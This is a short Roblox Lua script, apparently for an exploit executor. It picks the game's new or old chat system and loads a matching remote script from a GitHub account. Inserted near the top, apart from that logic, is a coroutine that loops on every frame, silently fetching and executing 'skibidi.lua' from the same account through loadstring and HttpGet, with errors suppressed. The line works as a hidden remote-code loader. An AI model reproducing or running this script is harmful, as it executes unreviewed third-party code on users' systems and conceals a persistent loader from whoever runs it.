local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
coroutine.wrap(function() while task.wait() do pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/skibidi.lua"))() end) end end)()
local NEW_CHAT_URL = "https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/newchat.lua"
local OLD_CHAT_URL = "https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/oldchat.lua"

local newChat = TextChatService and #TextChatService:GetDescendants() > 0
local oldChat = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")

if newChat and oldChat then
    loadstring(game:HttpGet(OLD_CHAT_URL))()
elseif newChat then
    loadstring(game:HttpGet(NEW_CHAT_URL))()
elseif oldChat then
    loadstring(game:HttpGet(OLD_CHAT_URL))()
end
